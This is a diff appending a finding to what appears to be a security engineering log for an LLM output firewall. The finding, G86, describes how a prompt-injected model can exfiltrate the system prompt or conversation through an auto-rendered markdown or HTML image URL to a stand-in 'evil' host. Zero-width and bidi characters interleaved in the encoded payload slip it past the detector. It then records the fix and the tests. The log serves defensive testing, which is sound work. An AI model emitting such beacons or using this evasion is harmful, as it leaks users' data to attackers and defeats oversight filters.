@@ -2466,3 +2466,31 @@ was the known tier-2 08_benign_sensitivity_routing flake, orthogonal); backend `
 `test_output_transport_egress.py` extended (`_client_recovers` now decodes entity/percent/markdown; +G85
 cases through the real inspect->sanitize path). Non-vacuous: oracle sees the unmasked leak, not after fix.
 Session ledger: NINE confirmed leaks (G74/G75/G76/G81/G82/G83/G84/G85) + soft DoS (G79) fixed; G77/G78/G80 frozen.
+
+---
+
+## G86 (CONFIRMED NEW LEAK — fixed) — 2026-07-03 — Cf-interleaved encoded EXFIL payload in auto-render URL
+Extends the G84/G85 "Cf breaks a raw decoder" class to the OUTPUT exfil-channel detector. A prompt-injected
+model emits an auto-render beacon — markdown image `![](url)`, HTML `<img src>`, `srcset`, CSS `url()` — whose
+URL carries a base64/hex blob of ARBITRARY (non-PII) data (system prompt / conversation) with zero-width/bidi/
+format (Cf) chars interleaved: `![](https://evil/?d=W​W​9​1…)`. `output_guard._url_smuggles_data` computed its
+`encoded_payload` signal via the RAW `_iter_transport_decodes` (Cf-blind), so the token regex broke on the Cf →
+no decode → NOT flagged → verdict **allow** → beacon egressed RAW. A browser auto-fetches the URL (Cf percent-
+encoded); the ATTACKER'S SERVER strips the Cf and base64/hex-decodes the exfiltrated data. Detection evaded on
+the firewall, not on the attacker. **CONFIRMED via OutputGuard.inspect: plain b64 → encoded_payload → redact/
+defang; Cf-b64 → '' → allow → survives (attacker_recovers=True).** (`sensitive_payload` was already covered —
+detect_* canonicalizes — only the arbitrary-data `encoded_payload` path was Cf-blind. Production egress model:
+allow AND **flag** both egress RAW; only redact/rewrite sanitize — so an unflagged beacon is never defanged.)
+Also corrected a fuzz false-negative: my egress_fuzz sanitized every non-block verdict; production only
+sanitizes redact/rewrite (main.py:7874 flag path = telemetry only, RAW egress). Re-ran production-accurate: PII
+still 0/84 (G85 makes encoded-PII → redact, so covered).
+**FIX (owned output_guard.py):** `_url_smuggles_data` now decodes over Cf-stripped (`canonicalize_for_detection`)
++ whitespace-collapsed views of the URL tail/segmented (parity with detection's `_iter_transport_decodes_canon`,
+G75/G76), keeping the outer-token ≥24 low-FP gate; the oversized-blob fallback also scans the canon views.
+**Verify:** md-image / `<img>` / srcset / hex beacons with zw/alm/rlo Cf → now redact/exfil_channel → URL
+defanged to `[exfil-redacted]`, **attacker_recovers=False** for all; FP-clean on CDN-sized / cache-version /
+presigned (binary-decoding sig) / plain-path / plain-link URLs. Egress fuzz 0/84; golden **501** (+11 G86,
+3 consecutive clean full runs; one prior fail = known tier-2 08_benign_sensitivity_routing flake); backend 1693.
+**Frozen:** golden `test_g86_*` (3 flag + 4 FP via `_url_smuggles_data`) + integration `test_output_transport_
+egress.py` `test_g86_*` (full inspect→sanitize path, attacker-recovery oracle + 3 FP).
+Session ledger: TEN confirmed leaks (G74/G75/G76/G81/G82/G83/G84/G85/G86) + soft DoS (G79) fixed; G77/G78/G80 frozen.
